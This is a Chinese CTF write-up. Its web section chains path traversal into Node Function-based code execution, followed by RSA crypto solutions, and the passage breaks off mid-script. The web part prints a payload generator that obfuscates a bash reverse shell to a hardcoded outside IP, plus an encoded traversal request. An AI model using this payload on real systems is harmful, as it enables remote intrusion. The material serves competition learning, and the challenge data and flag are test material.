拿到源码可知一共存在两个web服务，外层的PHP博客和内网中的node服务
简单看一下外面的php源码可以发现是就是一个简单的博客，具有文章增删查改的基础功能
在`GetRss/index.php`这里可以看到对内网中的node服务发起了请求，且获取了xml结果
那么看向node
这里获取了固定的`http://localhost/Rssinfo/index.php/`下的内容，回头看一下`Rssinfo/index.php`可以发现这里就是根据文章id返回相应信息的接口
而node服务正是获取其script标签中的`var passage = {****}`来执行
那是否我们能通过控制title或者author内容来闭合大括号来传入Function呢？
理论是可以的，但文章修改和发布都限制了`strlen($title) > 10 || strlen($author) > 10`
10个字符来RCE显然是行不通的，所以需要让它访问到我们发布的文章才行
回到node源码那里，可以看到访问`id`是直接拼接进URL的，那我们输入`../../`，传入`request`的就是`http://localhost/Rssinfo/index.php/../../`，即`http://localhost/`
答案呼之欲出了，就是通过目录穿越来访问到我们发布的文章，我们在发布的文章中构造payload来传入Function实现RCE
最后还有个点，因为页面防XSS缘故，单双引号都会被HTML实体编码，所以需要用String.fromCharCode绕一下
payload生成脚本如下
    cmd = "bash -c 'bash -i >& /dev/tcp/82.157.130.188/1234 0>&1'"
    strs = ''
    for i in cmd:
        num = ord(i)
        strs += "String.fromCharCode("+str(num)+")+"
    payload = "var passage = {1:global.process.mainModule.require(String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(105)+String.fromCharCode(108)+String.fromCharCode(100)+String.fromCharCode(95)+String.fromCharCode(112)+String.fromCharCode(114)+String.fromCharCode(111)+String.fromCharCode(99)+String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(115)).exec(" \
        + strs.strip("+") \
        + ")};"
    print(payload)
    #child_process
    #String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(105)+String.fromCharCode(108)+String.fromCharCode(100)+String.fromCharCode(95)+String.fromCharCode(112)+String.fromCharCode(114)+String.fromCharCode(111)+String.fromCharCode(99)+String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(115)
将生成的payload拿去发布文章
然后查看文章链接，如我这里就是`/article.show.php?id=2`
那我们路径穿越就需要设置为`../../article.show.php?id=2`，然后双重URL编码一下(浏览器+curl_exec)
访问`/GetRss/index.php/%252e%252e%252f%252e%252e%252f%2561%2572%2574%2569%2563%256c%2565%252e%2573%2568%256f%2577%252e%2570%2568%2570%253f%2569%2564%253d%2532`即可收到shell
# **CRYPTO**
## **little_trick**
​ RSA的dp和dq泄露攻击。
​ dp每一位位与rands[i%4]进行同或，dq每一位是用一个rsa加密。（rands需要用python2生成）
    from Crypto.Util.number import sieve_base, long_to_bytes
    import gmpy2
    import random
    def decode(p,q,dp,dq,c,n):
        invertP = gmpy2.invert(p,q)
        m1 = gmpy2.powmod(c,dp,p)
        m2 = gmpy2.powmod(c,dq,q)
        m =( ( (m2-m1) * invertP ) * p + m1 ) % n
        print(long_to_bytes((m)).decode())
    p = 119494148343917708105807117614773529196380452025859574123211538859983094108015678321724495609785332508563534950957367289723559468197440246960403054020452985281797756117166991826626612422135797192886041925043855329391156291955066822268279533978514896151007690729926904044407542983781817530576308669792533266431
    q = 125132685086281666800573404868585424815247082213724647473226016452471461555742194042617318063670311290694310562746442372293133509175379170933514423842462487594186286854028887049828613566072663640036114898823281310177406827049478153958964127866484011400391821374773362883518683538899757137598483532099590137741
    n = p * q
    c = 10238271315477488225331712641083290024488811710093033734535910573493409567056934528110845049143193836706122210303055466145819256893293429223389828252657426030118534127684265261192503406287408932832340938343447997791634435068366383965928991637536875223511277583685579314781547648602666391656306703321971680803977982711407979248979910513665732355859523500729534069909408292024381225192240385351325999798206366949106362537376452662264512012770586451783712626665065161704126536742755054830427864982782030834837388544811172279496657776884209756069056812750476669508640817369423238496930357725842768918791347095504283368032
    seeds = [3, 0, 39, 78, 14, 49, 73, 83, 55, 48, 30, 28, 23, 16, 54, 23, 68, 7, 20, 8, 98, 68, 45, 36, 97, 13, 83, 68, 16, 59, 81, 26, 51, 45, 36, 60, 36, 94, 58, 11, 19, 33, 95, 12, 60, 38, 51, 95, 21, 3, 38, 72, 47, 80, 7, 20, 26, 80, 18, 43, 92, 4, 64, 93, 91, 12, 86, 63, 46, 73, 89, 5, 91, 17, 88, 94, 80, 42, 90, 14, 45, 53, 91, 16, 28, 81, 62, 63, 66, 20, 81, 3, 43, 99, 54, 22, 2, 27, 2, 62, 88, 99, 78, 25, 76, 49, 28, 96, 95, 57, 94, 53, 32, 58, 32, 72, 89, 15, 4, 78, 89, 74, 86, 45, 51, 65, 13, 75, 95, 42, 20, 77, 34, 66, 56, 20, 26, 18, 28, 11, 88, 62, 72, 27, 74, 42, 63, 76, 82, 97, 75, 92, 1, 5, 20, 78, 46, 85, 81, 54, 64, 87, 37, 91, 38, 39, 1, 90, 61, 28, 13, 60, 37, 90, 87, 15, 78, 91, 99, 58, 62, 73, 70, 56, 82, 5, 19, 54, 76, 88, 4, 3, 55, 3, 3, 22, 85, 67, 98, 28, 32, 42, 48, 96, 69, 3, 83, 48, 26, 20, 45, 16, 45, 47, 92, 0, 54, 4, 73, 8, 31, 38, 3, 10, 84, 60, 59, 69, 64, 91, 98, 73, 81, 98, 9, 70, 44, 44, 24, 95, 83, 49, 31, 19, 89, 18, 20, 78, 86, 95, 83, 23, 42, 51, 95, 80, 48, 46, 88, 7, 47, 64, 55, 4, 62, 37, 71, 75, 98, 67, 98, 58, 66, 70, 24, 58, 56, 44, 11, 78, 1, 78, 89, 97, 83, 72, 98, 12, 41, 33, 14, 40, 27, 5, 18, 35, 25, 31, 69, 97, 84, 47, 25, 90, 78, 15, 72, 71]
    rands = [[23, 54, 36, 60] ,[84, 75, 42, 25] ,[20, 38, 19, 39] ,[81, 9, 92, 73] ,[10, 70, 65, 94] ,[6, 41, 11, 75] ,[27, 50, 56, 46] ,[49, 85, 8, 37] ,[9, 95, 14, 73] ,[54, 13, 71, 30] ,[53, 28, 3, 65] ,[11, 13, 59, 17] ,[92, 94, 89, 8] ,[36, 48, 41, 44] ,[91, 13, 55, 48] ,[92, 94, 89, 8] ,[74, 94, 74, 90] ,[32, 15, 65, 7] ,[90, 68, 76, 90] ,[22, 96, 12, 70] ,[35, 83, 35, 5] ,[74, 94, 74, 90] ,[27, 48, 8, 33] ,[32, 98, 95, 91] ,[19, 80, 37, 84] ,[25, 68, 68, 84] ,[49, 85, 8, 37] ,[74, 94, 74, 90] ,[36, 48, 41, 44] ,[22, 93, 94, 2] ,[50, 45, 55, 38] ,[74, 20, 20, 60] ,[24, 50, 16, 82] ,[27, 48, 8, 33] ,[32, 98, 95, 91] ,[30, 57, 26, 80] ,[32, 98, 95, 91] ,[54, 12, 28, 43] ,[58, 20, 64, 94] ,[45, 55, 92, 46] ,[67, 78, 52, 51] ,[57, 63, 81, 27] ,[76, 51, 99, 53] ,[47, 65, 66, 14] ,[30, 57, 26, 80] ,[63, 42, 72, 6] ,[24, 50, 16, 82] ,[76, 51, 99, 53] ,[16, 68, 63, 47] ,[23, 54, 36, 60] ,[63, 42, 72, 6] ,[7, 59, 98, 34] ,[35, 43, 45, 34] ,[27, 54, 70, 95] ,[32, 15, 65, 7] ,[90, 68, 76, 90] ,[74, 20, 20, 60] ,[27, 54, 70, 95] ,[18, 66, 33, 19] ,[3, 69, 14, 46] ,[42, 56, 55, 58] ,[23, 10, 39, 15] ,[47, 63, 40, 92] ,[91, 49, 56, 35] ,[8, 17, 68, 16] ,[47, 65, 66, 14] ,[79, 3, 83, 31] ,[44, 29, 90, 48] ,[88, 39, 58, 85] ,[27, 50, 56, 46] ,[8, 60, 99, 14] ,[62, 74, 79, 94] ,[8, 17, 68, 16] ,[52, 80, 96, 28] ,[39, 18, 90, 62] ,[54, 12, 28, 43] ,[27, 54, 70, 95] ,[63, 2, 27, 22] ,[20, 9, 65, 58] ,[10, 70, 65, 94] ,[27, 48, 8, 33] ,[61, 89, 45, 71] ,[8, 17, 68, 16] ,[36, 48, 41, 44] ,[11, 13, 59, 17] ,[50, 45, 55, 38] ,[92, 17, 97, 23] ,[44, 29, 90, 48] ,[7, 43, 24, 44] ,[90, 68, 76, 90] ,[50, 45, 55, 38] ,[23, 54, 36, 60] ,[3, 69, 14, 46] ,[40, 20, 17, 24] ,[91, 13, 55, 48] ,[95, 14, 2, 99] ,[95, 94, 5, 8] ,[64, 70, 95, 19] ,[95, 94, 5, 8] ,[92, 17, 97, 23] ,[39, 18, 90, 62] ,[40, 20, 17, 24] ,[81, 9, 92, 73] ,[37, 92, 84, 21] ,[37, 95, 20, 29] ,[6, 41, 11, 75] ,[11, 13, 59, 17] ,[37, 90, 39, 20] ,[76, 51, 99, 53] ,[4, 58, 1, 51] ,[54, 12, 28, 43] ,[61, 89, 45, 71] ,[7, 21, 30, 90] ,[58, 20, 64, 94] ,[7, 21, 30, 90] ,[7, 59, 98, 34] ,[8, 60, 99, 14] ,[96, 1, 73, 15] ,[23, 10, 39, 15] ,[81, 9, 92, 73] ,[8, 60, 99, 14] ,[85, 51, 11, 12] ,[79, 3, 83, 31] ,[27, 48, 8, 33] ,[24, 50, 16, 82] ,[41, 28, 84, 44] ,[25, 68, 68, 84] ,[45, 43, 4, 76] ,[76, 51, 99, 53] ,[63, 2, 27, 22] ,[90, 68, 76, 90] ,[79, 32, 24, 82] ,[52, 58, 84, 89] ,[7, 43, 24, 44] ,[96, 55, 47, 52] ,[90, 68, 76, 90] ,[74, 20, 20, 60] ,[18, 66, 33, 19] ,[11, 13, 59, 17] ,[45, 55, 92, 46] ,[39, 18, 90, 62] ,[92, 17, 97, 23] ,[7, 59, 98, 34] ,[64, 70, 95, 19] ,[85, 51, 11, 12] ,[63, 2, 27, 22] ,[44, 29, 90, 48] ,[37, 95, 20, 29] ,[14, 48, 50, 96] ,[19, 80, 37, 84] ,[45, 43, 4, 76] ,[42, 56, 55, 58] ,[13, 84, 76, 25] ,[62, 74, 79, 94] ,[90, 68, 76, 90] ,[81, 9, 92, 73] ,[88, 39, 58, 85] ,[19, 61, 10, 90] ,[50, 45, 55, 38] ,[91, 13, 55, 48] ,[47, 63, 40, 92] ,[14, 18, 83, 54] ,[68, 9, 61, 84] ,[8, 17, 68, 16] ,[63, 42, 72, 6] ,[20, 38, 19, 39] ,[13, 84, 76, 25] ,[20, 9, 65, 58] ,[49, 55, 80, 32] ,[11, 13, 59, 17] ,[25, 68, 68, 84] ,[30, 57, 26, 80] ,[68, 9, 61, 84] ,[20, 9, 65, 58] ,[14, 18, 83, 54] ,[96, 1, 73, 15] ,[81, 9, 92, 73] ,[8, 17, 68, 16] ,[40, 20, 17, 24] ,[58, 20, 64, 94] ,[92, 17, 97, 23] ,[27, 50, 56, 46] ,[90, 29, 45, 13] ,[96, 55, 47, 52] ,[14, 48, 50, 96] ,[62, 74, 79, 94] ,[67, 78, 52, 51] ,[91, 13, 55, 48] ,[37, 95, 20, 29] ,[39, 18, 90, 62] ,[23, 10, 39, 15] ,[23, 54, 36, 60] ,[9, 95, 14, 73] ,[23, 54, 36, 60] ,[23, 54, 36, 60] ,[95, 14, 2, 99] ,[19, 61, 10, 90] ,[7, 76, 97, 41] ,[35, 83, 35, 5] ,[11, 13, 59, 17] ,[7, 21, 30, 90] ,[63, 2, 27, 22] ,[54, 13, 71, 30] ,[37, 90, 39, 20] ,[68, 9, 16, 60] ,[23, 54, 36, 60] ,[49, 85, 8, 37] ,[54, 13, 71, 30] ,[74, 20, 20, 60] ,[90, 68, 76, 90] ,[27, 48, 8, 33] ,[36, 48, 41, 44] ,[27, 48, 8, 33] ,[35, 43, 45, 34] ,[42, 56, 55, 58] ,[84, 75, 42, 25] ,[91, 13, 55, 48] ,[23, 10, 39, 15] ,[27, 50, 56, 46] ,[22, 96, 12, 70] ,[1, 11, 39, 68] ,[63, 42, 72, 6] ,[23, 54, 36, 60] ,[57, 42, 57, 20] ,[73, 91, 3, 0] ,[30, 57, 26, 80] ,[22, 93, 94, 2] ,[68, 9, 16, 60] ,[47, 63, 40, 92] ,[8, 17, 68, 16] ,[35, 83, 35, 5] ,[27, 50, 56, 46] ,[50, 45, 55, 38] ,[35, 83, 35, 5] ,[46, 37, 13, 86] ,[90, 29, 45, 13] ,[40, 54, 86, 17] ,[40, 54, 86, 17] ,[71, 83, 18, 99] ,[76, 51, 99, 53] ,[49, 85, 8, 37] ,[6, 41, 11, 75] ,[1, 11, 39, 68] ,[67, 78, 52, 51] ,[8, 60, 99, 14] ,[18, 66, 33, 19] ,[90, 68, 76, 90] ,[81, 9, 92, 73] ,[79, 3, 83, 31] ,[76, 51, 99, 53] ,[49, 85, 8, 37] ,[92, 94, 89, 8] ,[63, 2, 27, 22] ,[24, 50, 16, 82] ,[76, 51, 99, 53] ,[27, 54, 70, 95] ,[54, 13, 71, 30] ,[88, 39, 58, 85] ,[39, 18, 90, 62] ,[32, 15, 65, 7] ,[35, 43, 45, 34] ,[47, 63, 40, 92] ,[9, 95, 14, 73] ,[23, 10, 39, 15] ,[92, 17, 97, 23] ,[68, 9, 61, 84] ,[32, 62, 0, 98] ,[45, 43, 4, 76] ,[35, 83, 35, 5] ,[7, 76, 97, 41] ,[35, 83, 35, 5] ,[58, 20, 64, 94] ,[7, 43, 24, 44] ,[90, 29, 45, 13] ,[71, 83, 18, 99] ,[58, 20, 64, 94] ,[96, 55, 47, 52] ,[40, 54, 86, 17] ,[45, 55, 92, 46] ,[81, 9, 92, 73] ,[13, 84, 76, 25] ,[81, 9, 92, 73] ,[8, 60, 99, 14] ,[19, 80, 37, 84] ,[49, 85, 8, 37] ,[7, 59, 98, 34] ,[35, 83, 35, 5] ,[47, 65, 66, 14] ,[38, 23, 16, 91] ,[57, 63, 81, 27] ,[10, 70, 65, 94] ,[45, 87, 3, 28] ,[64, 70, 95, 19] ,[62, 74, 79, 94] ,[18, 66, 33, 19] ,[54, 75, 74, 86] ,[37, 92, 84, 21] ,[1, 11, 39, 68] ,[68, 9, 16, 60] ,[19, 80, 37, 84] ,[73, 91, 3, 0] ,[35, 43, 45, 34] ,[37, 92, 84, 21] ,[20, 9, 65, 58] ,[81, 9, 92, 73] ,[96, 1, 73, 15] ,[7, 59, 98, 34] ,[32, 62, 0, 98]]
    result = [-38, -121, -40, -125, -51, -29, -2, -21, -59, -54, -51, -40, -105, -5, -4, -50, -127, -56, -124, -128, -23, -104, -63, -112, -34, -115, -58, -99, -24, -102, -1, -5, -34, -3, -104, -103, -21, -62, -121, -24, -115, -9, -87, -56, -39, -30, -34, -4, -33, -5, -114, -21, -19, -7, -119, -107, -115, -6, -25, -27, -32, -62, -28, -20, -60, -121, -102, -10, -112, -7, -85, -110, -62, -100, -110, -29, -41, -55, -113, -112, -45, -106, -125, -25, -57, -27, -83, -2, -51, -118, -2, -10, -50, -40, -1, -82, -111, -113, -50, -48, -23, -33, -112, -38, -29, -26, -4, -40, -123, -4, -44, -120, -63, -38, -41, -22, -50, -50, -17, -122, -61, -5, -100, -22, -44, -47, -125, -125, -127, -55, -117, -100, -2, -26, -32, -111, -123, -118, -16, -24, -20, -40, -92, -40, -102, -49, -99, -45, -59, -98, -49, -13, -62, -128, -121, -114, -112, -13, -3, -4, -26, -35, -15, -35, -8, -18, -125, -14, -6, -60, -113, -104, -120, -64, -104, -55, -104, -41, -34, -106, -105, -2, -28, -14, -58, -128, -3, -1, -17, -38, -18, -12, -59, -4, -19, -82, -40, -122, -18, -42, -53, -60, -113, -40, -126, -15, -63, -40, -124, -114, -58, -26, -35, -26, -8, -48, -112, -52, -11, -117, -52, -32, -21, -38, -124, -13, -103, -6, -30, -33, -28, -31, -1, -97, -59, -64, -28, -1, -40, -2, -10, -26, -24, -3, -50, -113, -125, -122, -124, -5, -50, -62, -11, -8, -88, -109, -7, -31, -105, -54, -28, -8, -62, -58, -101, -58, -53, -124, -18, -124, -17, -109, -52, -45, -40, -109, -85, -7, -108, -121, -58, -49, -91, -102, -8, -10, -17, -55, -19, -11, -116, -47, -120, -121, -23, -99, -19, -51, -36, -110, -126, -29, -110, -9, -97, -54, -83, -86]
    C = [1, 0, 7789, 1, 17598, 20447, 15475, 23040, 41318, 23644, 53369, 19347, 66418, 5457, 0, 1, 14865, 97631, 6459, 36284, 79023, 1, 157348, 44667, 185701, 116445, 23809, 220877, 0, 1, 222082, 30333, 55446, 207442, 193806, 149389, 173229, 349031, 152205, 1, 149157, 196626, 1, 222532, 10255, 46268, 171536, 0, 351788, 152678, 0, 172225, 109296, 0, 579280, 634746, 1, 668942, 157973, 1, 17884, 662728, 759841, 450490, 0, 139520, 157015, 616114, 199878, 154091, 1, 937462, 675736, 53200, 495985, 307528, 1, 804492, 790322, 463560, 520991, 436782, 762888, 267227, 306436, 1051437, 384380, 505106, 729384, 1261978, 668266, 1258657, 913103, 935600, 1, 1, 401793, 769612, 484861, 1024896, 517254, 638872, 1139995, 700201, 308216, 333502, 0, 0, 401082, 1514640, 667345, 1015119, 636720, 1011683, 795560, 783924, 1269039, 5333, 0, 368271, 1700344, 1, 383167, 7540, 1490472, 1484752, 918665, 312560, 688665, 967404, 922857, 624126, 889856, 1, 848912, 1426397, 1291770, 1669069, 0, 1709762, 130116, 1711413, 1336912, 2080992, 820169, 903313, 515984, 2211283, 684372, 2773063, 391284, 1934269, 107761, 885543, 0, 2551314, 2229565, 1392777, 616280, 1368347, 154512, 1, 1668051, 0, 2453671, 2240909, 2661062, 2880183, 1376799, 0, 2252003, 1, 17666, 1, 2563626, 251045, 1593956, 2215158, 0, 93160, 0, 2463412, 654734, 1, 3341062, 3704395, 3841103, 609968, 2297131, 1942751, 3671207, 1, 1209611, 3163864, 3054774, 1055188, 1, 4284662, 3647599, 247779, 0, 176021, 3478840, 783050, 4613736, 2422927, 280158, 2473573, 2218037, 936624, 2118304, 353989, 3466709, 4737392, 2637048, 4570953, 1473551, 0, 0, 4780148, 3299784, 592717, 538363, 2068893, 814922, 2183138, 2011758, 2296545, 5075424, 1814196, 974225, 669506, 2756080, 5729359, 4599677, 5737886, 3947814, 4852062, 1571349, 4123825, 2319244, 4260764, 1266852, 1, 3739921, 1, 5948390, 1, 2761119, 2203699, 1664472, 3182598, 6269365, 5344900, 454610, 495499, 6407607, 1, 1, 476694, 4339987, 5642199, 1131185, 4092110, 2802555, 0, 5323448, 1103156, 2954018, 1, 1860057, 128891, 2586833, 6636077, 3136169, 1, 3280730, 6970001, 1874791, 48335, 6229468, 6384918, 5412112, 1, 7231540, 7886316, 2501899, 8047283, 2971582, 354078, 401999, 6427168, 4839680, 1, 44050, 3319427, 0, 1, 1452967, 4620879, 5525420, 5295860, 643415, 5594621, 951449, 1996797, 2561796, 6707895, 7072739]
    dp = ''
    for i in range(0,len(result)):
        dp = dp + chr((~result[i]|rands[i][i%4]) & (result[i]|~rands[i][i%4]))
    dq = ''
    E = 0x10001
    list_p = sieve_base[0:len(C)]
    list_q = sieve_base[len(C):2*len(C)]
    for l in range(0,len(C)):
        P = list_p[l]
        Q = list_q[l]
        D = gmpy2.invert(E,(P-1)*(Q-1))
        dq = dq + str(pow(C[l],D,P*Q))
    decode(p,q,int(dp),int(dq),c,n)
    =====
    D0g3{Welc0me_t0_iSOON_4nd_have_4_go0d_time}
    >>>
## **ez_equation**
​ n的因子是5个素数，前三个素数利用公因数解出，最后利用费马分解得到后两个素数。
​ 分析得到n与M1有最大公因数p2，利用p2再解方程得到p1，p3
    from Crypto.Util.number import *
    import gmpy2
    M1= 3826382835023788442651551584905620963555468828948525089808250303867245240492543151274589993810948153358311949129889992078565218014437985797623260774173862776314394305207460929010448541919151371739763413408901958357439883687812941802749556269540959238015960789123081724913563415951118911225765239358145144847672813272304000303248185912184454183649550881987218183213383170287341491817813853157303415010621029153827654424674781799037821018845093480149146846916972070471616774326658992874624717335369963316741346596692937873980736392272357429717437248731018333011776098084532729315221881922688633390593220647682367272566275381196597702434911557385351389179790132595840157110385379375472525985874178185477024824406364732573663044243615168471526446290952781887679180315888377262181547383953231277148364854782145192348432075591465309521454441382119502677245090726728912738123512316475762664749771002090738886940569852252159994522316
    M2= 4046011043117694641224946060698160981194371746049558443191995592417947642909277226440465640195903524402898673255622570650810338780358645872293473212692240675287998097280715739093285167811740252792986119669348108850168574423371861266994630851360381835920384979279568937740516573412510564312439718402689547377548575653450519989914218115265842158616123026997554651983837361028152010675551489190669776458201696937427188572741833635865019931327548900804323792893273443467251902886636756173665823644958563664967475910962085867559357008073496875191391847757991101189003154422578662820049387899402383235828011830444034463049749668906583814229827321704450021715601349950406035896249429068630164092309047645766216852109121662629835574752784717997655595307873219503797996696389945782836994848995124776375146245061787647756704605043856735398002012276311781956668212776588970619658063515356931386886871554860891089498456646036630114620806
    c= 1394946766416873131554934453357121730676319808212515786127918041980606746238793432614766163520054818740952818682474896886923871330780883504028665380422608364542618561981233050210507202948882989763960702612116316321009210541932155301216511791505114282546592978453573529725958321827768703566503841883490535620591951871638499011781864202874525798224508022092610499899166738864346749753379399602574550324310119667774229645827773608873832795828636770263111832990012205276425559363977526114225540962861740929659841165039419904164961095126757294762709194552018890937638480126740196955840656602020193044969685334441405413154601311657668298101837066325231888411018908300828382192203062405287670490877283269761047853117971492197659115995537837080400730294215778540754482680476723953659085854297184575548489544772248049479632420289954409052781880871933713121875562554234841599323223793407272634167421053493995795570508435905280269774274084603687516219837730100396191746101622725880529896250904142333391598426588238082485305372659584052445556638990497626342509620305749829144158797491411816819447836265318302080212452925144191536031249404138978886262136129250971366841779218675482632242265233134997115987510292911606736878578493796260507458773824689843424248233282828057027197528977864826149756573867022173521177021297886987799897923182290515542397534652789013340264587028424629766689059507844211910072808286250914059983957934670979551428204569782238857331272372035625901349763799005621577332502957693517473861726359829588419409120076625939502382579605
    n= 19445950132976386911852381666731799463510958712950274248183192405937223343228119407660772413067599252710235310402278345391806863116119010697766434743302798644091220730819441599784039955347398797545219314925103529062092963912855489464914723588833817280786158985269401131919618320866942737291915603551320163001129725430205164159721810319128999027215168063922977994735609079166656264150778896809813972275824980250733628895449444386265971986881443278517689428198251426557591256226431727934365277683559038777220498839443423272238231659356498088824520980466482528835994554892785108805290209163646408594682458644235664198690503128767557430026565606308422630014285982847395405342842694189025641950775231191537369161140012412147734635114986068452144499789367187760595537610501700993916441274609074477086105160306134590864545056872161818418667370690945602050639825453927168529154141097668382830717867158189131567590506561475774252148991615602388725559184925467487450078068863876285937273896246520621965096127440332607637290032226601266371916124456122172418136550577512664185685633131801385265781677598863031205194151992390159339130895897510277714768645984660240750580001372772665297920679701044966607241859495087319998825474727920273063120701389749480852403561022063673222963354420556267045325208933815212625081478538158049144348626000996650436898760300563194390820694376019146835381357141426987786643471325943646758131021529659151319632425988111406974492951170237774415667909612730440407365124264956213064305556185423432341935847320496716090528514947
    p2 = gmpy2.gcd(n,M1)